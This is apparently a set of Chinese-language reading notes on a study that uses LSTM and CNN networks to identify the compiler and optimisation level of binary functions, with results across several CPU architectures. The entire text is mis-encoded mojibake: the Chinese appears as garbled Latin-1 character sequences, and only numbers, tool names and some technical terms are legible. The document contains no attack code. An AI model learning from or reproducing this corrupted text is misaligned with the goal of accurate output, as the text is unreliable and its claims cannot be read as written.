clang çš„æ•°æ®é›†ï¼Œå€¼é’ˆå¯¹ GCC è¿›è¡Œåˆ†æ é¢„å¤„ç† ç›®æ ‡ï¼šå°†äºŒè¿›åˆ¶æ–‡ä»¶è½¬æ¢ä¸ºä¸€ä¸ªæˆ–å¤šä¸ªè¾“å…¥å‘é‡ æ¯”è¾ƒäº†ä¸¤ç§æ–¹æ³•ï¼šä¸€ç§æ˜¯å­—èŠ‚æµï¼Œä¸€ç§æ˜¯æŒ‰ç…§å‡½æ•°è¾¹ç•Œæ‹†åˆ† æ–¹æ³•ä¸€ï¼šåŸå§‹å­—èŠ‚ ä¸ºäº†ç”Ÿæˆè¿™ç§è¡¨ç¤ºï¼Œæˆ‘ä»¬ä½¿ç”¨ readelf è½¬å‚¨å¯æ‰§è¡Œæ–‡ä»¶çš„. text éƒ¨åˆ†ï¼Œå¹¶å°†å…¶åˆ’åˆ†ä¸ºå›ºå®šå¤§å°çš„å—ã€‚ï¼ˆå¤§å°æ˜¯å¯å˜çš„ï¼‰ ç¼ºç‚¹æ˜¯æˆ‘ä»¬ä¸çŸ¥é“åŸå§‹æ•°æ®æ˜¯è¡¨ç¤ºæŒ‡ä»¤è¿˜æ˜¯å †æ ˆæ•°æ®ã€‚ æ–¹æ³•äºŒ Radare2 ç”¨äºä»å¯æ‰§è¡Œæ–‡ä»¶ä¸­æå–æ¯ä¸ªå‡½æ•° åˆ é™¤äº†è¡¨ç¤ºæŒ‡å®šè¦ä½¿ç”¨çš„å¯„å­˜å™¨çš„å­—èŠ‚ï¼ˆçº¢è‰²å­—èŠ‚ï¼‰ åˆ é™¤äº†æ“ä½œæ•°ï¼ˆç»¿è‰²ï¼‰ ä¿ç•™å‘½ä»¤ï¼ˆè“è‰²ï¼‰ï¼Œåªæœ‰è¿™éƒ¨åˆ†çš„å­—èŠ‚è¿›è¡Œäº†ç¼–ç  åœ¨è¿™ä¸¤ç§è¡¨ç¤ºä¸­ï¼Œæˆ‘ä»¬å°†æ•°æ®ä½œä¸ºæ—¶é—´åºåˆ—æä¾›ç»™ç½‘ç»œï¼Œå…¶ä¸­æ¯ä¸ªæ—¶é—´ç‚¹å®é™…ä¸Šæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œå›¾ 2 çš„å‰ä¸¤æ¡æŒ‡ä»¤å°†åœ¨åŸå§‹å­—èŠ‚æ–¹æ³•ä¸­ä½¿ç”¨è¿™ä¸ªå‘é‡:[0x48, 0x89, 0x44, 0x24, 0x18, 0x31, 0xC0]ã€‚åœ¨ç¼–ç çš„è¡¨ç¤ºä¸­ï¼Œå®ƒä»¬å°†æ˜¯[0x89, 0x31]ã€‚ å¡«å…… å› ä¸ºå‡½æ•°çš„é•¿åº¦æ€»æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡å¡«å……æ¥ä½¿å¾—è¾“å…¥å‘é‡é•¿åº¦ç›¸åŒã€‚å¹¶ä¸”å½“ä½¿ç”¨æ— å¡«å……å‘é‡è®­ç»ƒå‡ºæ¥çš„æ¨¡å‹ä¸èƒ½å¾ˆå¥½çš„æ¨æµ‹æœ‰å¡«å……çš„æ•°æ®ã€‚\nä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨åŒºé—´[0ï¼ŒÎ±]ä¸­æˆªæ–­ä¸€ä¸ªéšæœºå­—èŠ‚æ•°ï¼Œå…¶ä¸­ $Î±=len(v)-32$ï¼Œv æ˜¯è¾“å…¥å‘é‡å­—èŠ‚å¤§å°ã€‚ éšæœºé‡æ˜¯ç”±æŒ‡æ•°åˆ†å¸ƒå®šä¹‰çš„ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯ä½¿ç”¨ä¸€ä¸ªåˆ†å¸ƒï¼Œå…¶ä¸­ 99%çš„å€¼è½åœ¨ä¸Šè¿°åŒºé—´å†…ï¼ŒåŒæ—¶å°†å¼‚å¸¸å€¼é™åˆ¶åœ¨ 32ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç½‘ç»œå°†ä¸»è¦æ¥æ”¶ä½å¡«å……å‘é‡ï¼Œè€Œå¶å°”é‡åˆ°å¡«å……æœ€å¤šçš„å‘é‡ã€‚åˆ©ç”¨æŒ‡æ•°ç´¯ç§¯åˆ†å¸ƒå‡½æ•° y = 1âˆ’eâˆ’Î»xï¼Œå°† y å›ºå®šä¸º 0.99, x å›ºå®šä¸ºÎ±ï¼Œå¾—åˆ° $Î»=\\frac{2\\ln_{}{10} }{\\alpha }$ åœ¨æˆªæ–­è¾“å…¥ä¹‹åï¼Œæˆ‘ä»¬é€šè¿‡åŠ  0 æ¥é¢„æ‰©å±•å®ƒã€‚ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ ç½‘ç»œ äº‹å®ä¸Šï¼Œæˆ‘ä»¬å°†ä¼˜åŒ–è¯†åˆ«é—®é¢˜å»ºæ¨¡ä¸ºæ¨¡å¼è¯†åˆ«é—®é¢˜: ä¸€ä¸ªç‰¹å®šçš„ä¼˜åŒ–å¯ä»¥è¢«ç½‘ç»œè¯†åˆ«ä¸ºè¾“å…¥å­—èŠ‚åºåˆ—ä¸­çš„æ“ä½œç æ¨¡å¼ã€‚\næ‰€ä»¥ä½¿ç”¨ CNN å’Œ LSTM æ¨¡å‹å®ƒä»¬åœ¨ NLP å’Œå›¾åƒå¤„ç†é¢†åŸŸè¡¨ç°çš„å¥½ LSTM ç¬¬ä¸€ä¸ªæ¨¡å‹å¦‚å›¾ 4 æ‰€ç¤ºã€‚è¿™ä¸ªæ¨¡å‹æè¿°äº†ä¸€ä¸ªç®€å•çš„ LSTMï¼Œæˆ‘ä»¬çš„æ ¸å¿ƒæ€æƒ³æ˜¯è®­ç»ƒè¿™ç§æ¨¡å‹é€šè¿‡ä¸€é•¿ä¸²å±äºäºŒè¿›åˆ¶çš„å­—èŠ‚æ¥è®°å¿†ç‰¹å®šçš„æ¨¡å¼ï¼Œè¡¨ç¤ºç¼–è¯‘å™¨æˆ–ä¼˜åŒ–çº§åˆ«ã€‚ åµŒå…¥å±‚è¾“å…¥å’Œè¾“å‡ºç»´åº¦åˆ†åˆ«æ˜¯ 256ï¼ˆè¾“å…¥æ˜¯ 8 ä½ 2 ä¸ªå­—èŠ‚ï¼‰ å’Œ 128ï¼Œè¯¥å±‚å°†äºŒè¿›åˆ¶ç¼–ç æˆè¾“å…¥å‘é‡ ç„¶åä½¿ç”¨ 256 ä¸ªå•å…ƒçš„ LSTM å±‚è¿›è¡Œå®é™…å­¦ä¹ ï¼Œä½¿ç”¨åŒæ›²æ­£åˆ‡ (tanh) ä½œä¸ºæ¿€æ´»å‡½æ•° æœ€åä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªå¯†é›†å±‚ï¼Œå¯¹äºäºŒè¿›åˆ¶æƒ…å†µæœ‰ 1 ä¸ªè¾“å‡ºå’Œ Sigmoid æ¿€æ´»ï¼Œå¯¹äºå¤šç±»æƒ…å†µæœ‰ 5 ä¸ªè¾“å‡ºå’Œ Softmax æ¿€æ´»ã€‚ ä¼˜åŒ–å™¨æ˜¯ adamï¼Œå­¦ä¹ ç‡ä¸º 0.003 CNN å…¶æ€æƒ³æ˜¯ä½¿ç”¨ä¸€ç³»åˆ—å·ç§¯ä»ä½œä¸ºè¾“å…¥ä¼ é€’çš„åŸå§‹å­—èŠ‚åºåˆ—ä¸­æå–é«˜ç»´ä¿¡æ¯ã€‚ ç¬¬ä¸€å±‚å’Œ LSTM ç›¸åŒ ç„¶åä½¿ç”¨å·ç§¯ã€å·ç§¯å’Œæ± åŒ–ä¸‰ä¸ªå—ã€‚åœ¨å›¾ä¸­ï¼Œå·ç§¯å±‚çš„æ ‡ç­¾ k3n32s1 è¡¨ç¤ºå†…æ ¸å¤§å°ä¸º 3ï¼Œè¿‡æ»¤å™¨æ•°é‡ä¸º 32ï¼Œæ­¥å¹…ä¸º 1ã€‚åœ¨è¿™äº›å—ä¸­ï¼Œå·ç§¯ç”¨äºä»å­—èŠ‚åºåˆ—ä¸­æå–ç‰¹å¾ï¼Œæ± åŒ–ç”¨äºä½¿è¿™äº›ç‰¹å¾ç‹¬ç«‹äºå®ƒä»¬åœ¨åºåˆ—ä¸­çš„ä½ç½®ã€‚ å› ä¸º ReLU å­˜åœ¨æ¢¯åº¦æ¶ˆå¤±çš„é—®é¢˜ï¼Œæ‰€ä»¥ä½¿ç”¨äº† leakyReLU åœ¨è¾“å‡ºä¹‹å‰ï¼Œä½¿ç”¨ç”± 1024 ä¸ªç¥ç»å…ƒç»„æˆçš„æœ€ç»ˆå…¨è¿æ¥å±‚ï¼Œç„¶åä½¿ç”¨ ReLU æ¿€æ´»å’Œæ­£åˆ™å¯†é›†å±‚å’Œ sigmoid è¿›è¡ŒäºŒè¿›åˆ¶åˆ†ç±»æˆ–ä½¿ç”¨å¯†å’Œ softmax è¿›è¡Œå¤šç±»åˆ†ç±»ã€‚ ä¼˜åŒ–å™¨æ˜¯ Adamï¼Œå­¦ä¹ ç‡ä¸º 10âˆ’3ã€‚ æ‰€æœ‰æ¨¡å‹å‡ä»¥äºŒå…ƒäº¤å‰ç†µä½œä¸ºäºŒå…ƒåˆ†ç±»çš„æŸå¤±å‡½æ•°ï¼Œä»¥èŒƒç•´äº¤å‰ç†µä½œä¸ºå¤šç±»åˆ†ç±»[33]çš„æŸå¤±å‡½æ•°ã€‚ ä½¿ç”¨è¶…å¸¦ç®—æ³•[34]ä¼°è®¡ LSTM å’Œ CNN çš„è¶…å‚æ•°ã€‚æˆ‘ä»¬åœ¨åŒºé—´[32, 1024]ä¸­ä½¿ç”¨ 2 çš„å¹‚ä½œä¸ºç©ºé—´æœç´¢ï¼Œé™¤äº†å†…æ ¸å¤§å°å’Œ stride ä¹‹å¤–ã€‚å¯¹äºå†…æ ¸å¤§å°ï¼Œç©ºé—´æœç´¢æ˜¯é›†åˆ{3, 5, 7}ã€‚ç›¸åï¼Œå¯¹äº strideï¼Œç©ºé—´æœç´¢æ˜¯{1, 2}ã€‚\nè¯„ä¼° å‡†ç¡®æ€§ æ ¹æ®æ¶æ„åˆ’åˆ†äº†æ•°æ®é›†\næ¯ä¸ªæ ·æœ¬çš„ç‰¹å¾æ•°é‡æ˜¯æ¥è‡ªæŒ‡å®šæ¶æ„çš„ 2048 ä¸ªè¿ç»­å­—èŠ‚ï¼ŒæŒ‰ä¼˜åŒ–çº§åˆ«åˆ†ç±»ã€‚\næˆ‘ä»¬ä¸ºæ¯ä¸ªæ•°æ®é›†è®­ç»ƒäº† CNN å’Œ LSTM æ¨¡å‹ï¼Œå¾—åˆ°äº†ä¼˜åŒ–æ°´å¹³æ£€æµ‹çš„ç»“æœå¦‚è¡¨ 2 æ‰€ç¤ºã€‚ï¼ˆæ³¨æ„ï¼Œé™¤éå¦æœ‰è¯´æ˜ï¼Œæ‰€æœ‰ç»“æœéƒ½æ˜¯ä½¿ç”¨åŸå§‹ç¼–ç å’Œå¡«å……æ•°æ®è·å¾—çš„ã€‚ï¼‰\nå‡†ç¡®åº¦çš„è®¡ç®—å…¬å¼ï¼š æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°\nLSTM æ€»æ˜¯æ¯” CNN å¥½ åœ¨ä¸¤ä¸ªç½‘ç»œä¸­ï¼Œx86_64ã€RISC-V å’Œ PowerPC çš„ç²¾åº¦éƒ½æ˜¯æœ€å·®çš„ã€‚ ä½¿ç”¨ LSTM çš„ç¼ºç‚¹æ˜¯å®ƒéœ€è¦å¤§é‡çš„è®­ç»ƒæ—¶é—´ï¼ŒCNN æ¯” LSTM å¿«ä¸¤åˆ°ä¸‰å€ LSTM å¤§çº¦éœ€è¦ 7 ä¸ª epoch æ‰èƒ½åœ¨ç¬¬ä¸€ä¸ª epoch ç»“æŸæ—¶è¾¾åˆ°ä¸ CNN ç›¸åŒçš„ç²¾åº¦ã€‚ ä¸ºäº†è¿›ä¸€æ­¥ç ”ç©¶å‡†ç¡®ç‡ï¼Œå›¾ 7 æ˜¾ç¤ºäº†ä½¿ç”¨ CNN è®­ç»ƒçš„æ¯ä¸ªæ¨¡å‹çš„æ‰€æœ‰æ··æ·†çŸ©é˜µã€‚ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œé—®é¢˜çš„éƒ¨åˆ†æ˜¯ O2 å’Œ O3 ä¹‹é—´çš„åŒºåˆ«ã€‚äº‹å®ä¸Šï¼ŒO0 å’Œ O1 åœ¨ä»»ä½•æ¶æ„ä¸­éƒ½å¯ä»¥ä»¥ 99%çš„å‡†ç¡®ç‡æ£€æµ‹åˆ°ï¼Œè€Œ Os æ°¸è¿œä¸ä¼šä½äº 96%ã€‚ç„¶è€Œï¼ŒO3 åœ¨æœ€åçš„æƒ…å†µä¸‹ï¼Œé”™è¯¯çš„åˆ†ç±»æ¯”æ­£ç¡®çš„åˆ†ç±»æ›´å¤šï¼Œæ­£å¦‚æˆ‘ä»¬åœ¨ PowerPC å’Œ RISC-V ä¸­çœ‹åˆ°çš„é‚£æ ·ã€‚å½“ä½¿ç”¨ LSTM æ—¶ï¼Œè¿™ç§æƒ…å†µç¨å¾®å¥½ä¸€äº›ã€‚ç»“æœå¦‚å›¾ 8 æ‰€ç¤ºã€‚åœ¨è¿™å¼ å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° LSTM åœ¨ AArch64ã€SPARCã€MIPSã€ARM ç­‰æ¶æ„ä¸‹æ˜¯å¦‚ä½•è¾¾åˆ°è¾ƒé«˜ç²¾åº¦çš„ã€‚CNN çš„æ¶æ„é—®é¢˜ä»ç„¶å­˜åœ¨äº LSTM ä¸­ï¼Œä½†ç¨‹åº¦è¦å°å¾—å¤šã€‚äº‹å®ä¸Šï¼Œæ²¡æœ‰å“ªä¸ªä¼˜åŒ–çº§åˆ«æŠ¥å‘Šçš„é”™è¯¯åˆ†ç±»æ¯”æ­£ç¡®åˆ†ç±»æ›´å¤šï¼ŒPowerPC O2 çš„æœ€åæƒ…å†µå‡†ç¡®ç‡ä¸º 70%ã€‚\nä¸ºäº†ç¼“è§£è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è®­ç»ƒäº†ä¸¤ä¸ªé¢å¤–çš„æ•°æ®é›†: Dmerged å’Œ dsplit: ç¬¬ä¸€ä¸ªåŒ…å«æ‰€æœ‰ä¼˜åŒ–æ ‡å¿—ï¼Œä½†å°† O2 å’Œ O3 åˆå¹¶åœ¨ä¸€èµ·ï¼Œç¬¬äºŒä¸ªåªåŒ…å« O2 å’Œ O3ã€‚å›¾ 9 æŠ¥å‘Šäº†è¿™ç§æ•°æ®é›†åˆ†è£‚çš„æƒ…å†µã€‚æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ï¼Œä»æ•°æ®é›†çš„å…¶ä½™éƒ¨åˆ†åˆ†ç¦» O2 å’Œ O3 åï¼ŒCNN ç½‘ç»œçš„è¡¨ç°ç•¥å¥½ï¼Œè€Œ LSTM ä¸æœªåˆ†ç¦»çš„ç»“æœç›¸æ¯”ï¼Œè¡¨ç°ç•¥å·®ã€‚\nå…³äºç¼–è¯‘å™¨æ£€æµ‹ï¼Œç»“æœå¦‚è¡¨ 4 æ‰€ç¤ºã€‚è¯¥è¡¨æ˜¾ç¤ºäº†ä¸¤ç§æ¶æ„ä¸­çš„ä¸¤ä¸ªç½‘ç»œå¦‚ä½•å‡ºè‰²åœ°æ‰§è¡Œã€‚å³ä½¿åœ¨å¸¦æœ‰ CNN çš„ x86_64 æ¡ˆä¾‹ä¸­ï¼Œä¼˜åŒ–æ£€æµ‹è¡¨ç°å¾ˆå·®ï¼Œé”™è¯¯åˆ†ç±»ä¸º 587 ä¸ªï¼Œè€Œæ­£ç¡®åˆ†ç±»ä¸º 1225822 ä¸ªã€‚è€ƒè™‘åˆ° CNN çš„é«˜ç²¾åº¦å’Œä¸ LSTM ç›¸æ¯”æ›´å¿«çš„é€Ÿåº¦ï¼Œå®ƒåº”è¯¥æ˜¯ç¼–è¯‘å™¨æ£€æµ‹çš„é¦–é€‰ã€‚\næœ€å°çš„å­—èŠ‚ æœ¬èŠ‚å°†ç ”ç©¶ç”¨å‡½æ•°ç²’åº¦æ£€æµ‹ä¼˜åŒ–çº§åˆ«å’Œç¼–è¯‘å™¨çš„å¯èƒ½æ€§ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯¹æ¯ä¸ªæ¨¡å‹æ‰§è¡Œè¯„ä¼°ï¼ŒåŒæ—¶è¾“å…¥é€æ¸å¢åŠ çš„å­—èŠ‚æ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æ‰§è¡Œåˆå§‹è¯„ä¼°æ—¶ï¼Œæ¯ä¸ªæ ·æœ¬åªæœ‰ 1 ä¸ªå­—èŠ‚; ç„¶åï¼Œæˆ‘ä»¬ç”¨ 2 ä¸ªå­—èŠ‚æ‰§è¡Œç¬¬äºŒæ¬¡æ±‚å€¼ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æˆ‘ä»¬ä½¿ç”¨äº† 2048 å­—èŠ‚çš„å®Œæ•´å‘é‡é•¿åº¦ã€‚ å›¾ 10 æ˜¾ç¤ºäº†ä½¿ç”¨ CNN ç½‘ç»œè·å¾—çš„ç»“æœã€‚å›¾ 11 æ˜¾ç¤ºäº†ç›¸åŒçš„ç»“æœï¼Œä½†ä½¿ç”¨çš„æ˜¯ LSTM ç½‘ç»œã€‚ æ³¨æ„åœ¨ LSTM ç½‘ç»œä¸­ï¼Œæ¯ç§æ¶æ„éƒ½éµå¾ªç›¸åŒçš„æ£€æµ‹è¶‹åŠ¿ã€‚ç„¶è€Œï¼Œä¸å…¶ä»–æ¶æ„ä¸åŒçš„æ˜¯ï¼Œåœ¨ CNN æ¶æ„ä¸­ï¼Œx86_64ã€PowerPC å’Œ RISC-V çš„å‡†ç¡®æ€§åœæ­¢äº†å¢é•¿ã€‚ è¿™ä¸‰ä¸ªä½“ç³»æ¶æ„åœ¨ V-A èŠ‚çš„æ··æ·†çŸ©é˜µä¸­ä¹Ÿæ˜¯é—®é¢˜æœ€ä¸¥é‡çš„ä¸‰ä¸ªæ¶æ„ï¼Œä½†æ˜¯ LSTM ä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œè¯´æ˜ CNN ä¸å¤ªèƒ½å¾ˆå¥½çš„è¯†åˆ«è¿™äº›æ¶æ„ä¸­çš„ O2 å’Œ O3 ä¼˜åŒ–ã€‚ åŒæ—¶å¯¹äºä»»æ„æ•°é‡çš„å­—èŠ‚ï¼ŒLSTM çš„æ€§èƒ½è‚¯å®šè¦å¥½äº CNN ä¸ºäº†çªå‡ºæ˜¾ç¤ºè¿™ä¸€ç‚¹ï¼Œå›¾ 12 æ˜¾ç¤ºäº† LSTM å’Œ CNN åœ¨å•ä¸€ä½“ç³»ç»“æ„ x86_64 ä¸­çš„ç›´æ¥æ¯”è¾ƒã€‚è¯¥å›¾æ˜¾ç¤ºäº† LSTM çš„é¢„æµ‹ä¸ CNN çš„é¢„æµ‹ç›¸æ¯”ï¼Œæ€»æ˜¯æœ‰å¤§çº¦ 5%çš„å‡†ç¡®æ€§ã€‚ åœ¨åˆ†æäº†è¾“å…¥é•¿åº¦å˜åŒ–æ—¶æ•´ä½“ç²¾åº¦å¦‚ä½•å˜åŒ–ä¹‹åï¼Œæˆ‘ä»¬ç°åœ¨è¦æ£€æŸ¥å¹³å‡å‡½æ•°é•¿åº¦æ˜¯å¦è¶³ä»¥è¾¾åˆ°è‰¯å¥½çš„ç²¾åº¦ã€‚\nå…¶æ€æƒ³æ˜¯è®¡ç®—æ¯ä¸ªä¼˜åŒ–çº§åˆ«çš„å¹³å‡å‡½æ•°é•¿åº¦ï¼Œå¹¶åœ¨ç‰¹å®šé•¿åº¦å¤„æ£€æŸ¥è¯¥ç‰¹å®šçº§åˆ«çš„ç½‘ç»œçš„å‡†ç¡®æ€§ã€‚æˆ‘ä»¬åˆ†è§£äº†æ¯ä¸ªä¼˜åŒ–çº§åˆ«å’Œç¼–è¯‘å™¨çš„æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶è®¡ç®—äº†ç»„æˆæ¯ä¸ªå‡½æ•°çš„å­—èŠ‚æ•°ã€‚ç»“æœå¦‚å›¾ 13 æ‰€ç¤ºã€‚ ä½†æ˜¯å¹³å‡å€¼ä¸å¤ªå‡†ç¡®ï¼Œä¼šå—åˆ°ä¸€äº›å…·æœ‰éå¸¸é«˜çš„å­—èŠ‚æ•° (å¤§çº¦ 106 ä¸ªå­—èŠ‚) çš„å¼‚å¸¸å€¼çš„å½±å“ã€‚ ä¸‹å›¾å±•ç¤ºäº†é€‰å–çš„ä¸­ä½å€¼å’Œå¯¹åº”çš„å‡†ç¡®åº¦ï¼ŒåŒæ ·åœ¨ O2 å’Œ O3 ä¸Šè¡¨ç°å¾ˆåƒ å…³äºç¼–è¯‘å™¨æ£€æµ‹ï¼Œå¢åŠ å­—èŠ‚æ•°çš„ç²¾åº¦å›¾å¯ä»¥åœ¨å›¾ 14 ä¸­çœ‹åˆ°ã€‚ä¸ç”¨äºä¼˜åŒ–çº§åˆ«æ£€æµ‹çš„ CNN å’Œ LSTM æ¯”è¾ƒä¸åŒï¼Œåœ¨å›¾ 12 ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªç½‘ç»œä¹‹é—´çš„å·®å¼‚éå¸¸å°ï¼Œå³ä½¿è¾“å…¥æ›´çŸ­ã€‚æ­¤å¤–ï¼Œå³ä½¿åœ¨æ²¡æœ‰å¤ªå¤šæ•°æ®å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œå‡†ç¡®æ€§ä¹Ÿå¾ˆé«˜; ä¾‹å¦‚ï¼Œåªæœ‰ 100 ä¸ªå­—èŠ‚ï¼Œå°±æœ‰å¯èƒ½æœ‰è¶…è¿‡ 90%çš„å‡†ç¡®ç‡ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ­£ç¡®åœ°é¢„æµ‹ç¼–è¯‘å™¨ï¼Œå³ä½¿æ˜¯å‡½æ•°ç²’åº¦ã€‚ æ€»ç»“ï¼šåœ¨æ‰§è¡Œå‡½æ•°ç²’åº¦åˆ†ææ—¶ï¼Œè¾“å…¥è¾ƒçŸ­ï¼Œé€šå¸¸å¯ä»¥æ£€æµ‹ O0ã€O1 å’Œ Os ä¼˜åŒ–çº§åˆ«ã€‚ç›¸åï¼Œè€ƒè™‘åˆ° O2 å’Œ O3 çš„ç»†å¾®å·®åˆ«ï¼Œå®ƒä»¬éœ€è¦å°½å¯èƒ½å¤šçš„å­—èŠ‚ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œç¼–è¯‘å™¨æ£€æµ‹å°±ä¸ä¼šé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œå³ä½¿åªæœ‰ 102 ä¸ªè¾“å…¥å­—èŠ‚ï¼Œä¹Ÿèƒ½è¾¾åˆ°å¾ˆé«˜çš„ç²¾åº¦ã€‚\nç¼–ç  åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†åŸå§‹è¾“å…¥ä¸ç¬¬ IV-B èŠ‚ä¸­è§£é‡Šçš„ç¼–ç å˜ä½“è¿›è¡Œæ¯”è¾ƒã€‚åˆ†æç»“æœå¦‚å›¾ 15 æ‰€ç¤ºï¼Œå…¶ä¸­åªæè¿°äº† x86_64 ä½“ç³»ç»“æ„ã€‚ ç¼–ç åçš„å˜ä½“åœ¨è¾“å…¥é•¿åº¦çº¦ä¸º 250 å­—èŠ‚æ—¶è¾¾åˆ°äº†æœ€å¤§ç²¾åº¦ã€‚ç›¸åï¼ŒåŸå§‹è¾“å…¥å˜é‡ï¼Œéšç€æ›´å¤šçš„å­—èŠ‚æä¾›ç»™å®ƒï¼Œç²¾åº¦ç¨³æ­¥æé«˜ï¼Œè¶…è¿‡äº†è¿™ä¸ªé™åˆ¶ã€‚ åœ¨åˆ†æç¼–è¯‘å™¨æ£€æµ‹æ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„æƒ…å†µï¼Œå¦‚å›¾ 16 æ‰€ç¤ºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¼–ç çš„å˜ä½“åœ¨æ²¡æœ‰è¿›ä¸€æ­¥æ”¹è¿›çš„æƒ…å†µä¸‹è¾¾åˆ°äº†å¤§çº¦ 100 å­—èŠ‚çš„æœ€å¤§ç²¾åº¦ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒåŸå§‹æ•°æ®çš„å‡†ç¡®æ€§ç»§ç»­æé«˜ï¼Œåœ¨ 150 å­—èŠ‚æ—¶ä¼˜äºç¼–ç å˜ä½“ï¼Œåœ¨ 1000 å­—èŠ‚æ—¶è¾¾åˆ°å³°å€¼ã€‚ ç„¶è€Œï¼Œæˆ‘ä»¬å†³å®šä¸å°†æ­¤åˆ†ææ‰©å±•åˆ°æ‰€æœ‰ 7 ä¸ªæ¶æ„ã€‚äº‹å®ä¸Šï¼Œåœ¨ç¬¬ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬ç ”ç©¶çš„åŠ¨æœºä¹‹ä¸€æ˜¯æœ‰ä¸€ç§è‡ªåŠ¨æ£€æµ‹ä¼˜åŒ–æ ‡å¿—çš„æ–¹æ³•ï¼Œè¿™ç§æ–¹æ³•ä¸éœ€è¦æ·±å…¥äº†è§£åº•å±‚æ¶æ„ã€‚ç„¶è€Œï¼Œè¦ç”Ÿæˆç¼–ç çš„å˜ä½“ï¼Œæœ‰å¿…è¦æŒæ¡ç›®æ ‡ä½“ç³»ç»“æ„çš„åŸºæœ¬çŸ¥è¯†ï¼Œè¿™ä¸æˆ‘ä»¬æœ€åˆçš„åŠ¨æœºç›¸çŸ›ç›¾ã€‚è¿™ä¸€äº‹å®ï¼Œé™¤äº†æ€§èƒ½å·®å’Œéœ€è¦ç²¾ç¡®çš„æ‹†å¸ï¼Œä¿ƒä½¿æˆ‘ä»¬æ”¾å¼ƒäº†ç¼–ç å˜ä½“çš„ç ”ç©¶ã€‚ åœ¨ç»“æŸæœ¬èŠ‚ä¹‹å‰ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒChen ç­‰äººçš„ç ”ç©¶ä½¿ç”¨äº†ä¸€ä¸ªå° 100 å€çš„æ•°æ®é›†ï¼Œå¹¶ç¡®å®šç¼–ç å˜ä½“æ˜æ˜¾æ›´å¥½[11]ã€‚åœ¨æˆ‘ä»¬ä¹‹å‰çš„ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªæ¯”å½“å‰æ•°æ®é›†å° 10 å€çš„æ•°æ®é›†ï¼Œå¹¶ç¡®å®šç¼–ç å˜é‡ä¸åŸå§‹å˜é‡[12]ç›¸åŒã€‚æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°å‡è®¾ï¼Œå¯¹äºè¾ƒå°çš„æ•°æ®é›†ï¼Œç½‘ç»œå­¦ä¹ åŸå§‹æ•°æ®ä¸­å“ªäº›ä¿¡æ¯æœ‰ç”¨ï¼Œå“ªäº›ä¿¡æ¯æ²¡æœ‰ç”¨çš„èƒ½åŠ›è¾ƒå·®ã€‚è¿™å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆåœ¨ä»¥å‰çš„ç ”ç©¶ä¸­ï¼Œæ²¡æœ‰æ— ç”¨å‰ç¼€çš„ç¼–ç å˜ä½“æä¾›çš„æ•°æ®æ›´å…·ç«äº‰åŠ›ã€‚ç„¶è€Œï¼Œå¯¹äºä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ•°æ®é›†ï¼Œç¼–ç çš„å˜ä½“å¹¶ä¸èƒ½æä¾›ä»»ä½•ä¼˜åŠ¿ã€‚ æ€»ç»“ï¼šåˆ†è§£å’Œç¼–ç æ•°æ®å¹¶ä¸èƒ½æä¾›é¢å¤–çš„å¥½å¤„ï¼Œéœ€è¦äº†è§£åº•å±‚æ¶æ„å’Œå‡½æ•°åˆ†è§£æ‰èƒ½è·å¾—è¾ƒä½çš„æ•´ä½“ç²¾åº¦ã€‚\nå¡«å…… åœ¨ç¬¬ IV-B èŠ‚ä¸­ï¼Œæˆ‘ä»¬æ–­è¨€ï¼Œå¦‚æœåœ¨è®­ç»ƒæœŸé—´ä»æœªå¡«å……åŸå§‹å­—èŠ‚åºåˆ—ï¼Œç„¶åé¢„æµ‹å¡«å……åºåˆ—ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç½‘ç»œæ€§èƒ½ä¼šæ›´å·®ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç» RQpadï¼Œå¹¶ç ”ç©¶åœ¨è®­ç»ƒæœŸé—´å¡«å……å’Œä¸å¡«å……ä¹‹é—´çš„åŒºåˆ«ã€‚æœ‰å¡«å……å’Œæ— å¡«å……å˜ä½“ä¹‹é—´çš„å·®å¼‚å¦‚å›¾ 17 æ‰€ç¤º 